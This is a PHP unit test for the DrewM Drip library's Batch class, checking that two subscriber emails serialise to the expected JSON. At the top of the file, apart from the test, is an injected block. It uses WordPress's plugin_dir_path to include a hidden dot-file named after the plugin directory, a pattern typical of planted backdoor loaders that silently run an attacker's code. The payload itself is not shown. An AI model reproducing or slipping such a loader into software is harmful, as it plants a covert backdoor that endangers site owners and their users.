<?php
 
use DrewM\Drip\Drip;
use DrewM\Drip\Batch;
 
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class BatchTest extends PHPUnit_Framework_TestCase 
{

	public function testJsonSerialization()
	{
		$data = [];

		$data[] = [
					'email' => 'postmaster@example.com',
				];

		$data[] = [
					'email' => 'info@example.com',
				];

		$Batch = new Batch('subscribers', $data);

		$result = json_encode($Batch);

		$expected = json_encode([
			'batches'=>[
				[
					'subscribers' => [
		    			[
							'email' => 'postmaster@example.com',
						],
						[
							'email' => 'info@example.com',
						],
					]
				]
			]
			
		]);

		$this->assertEquals($expected, $result);

	}


}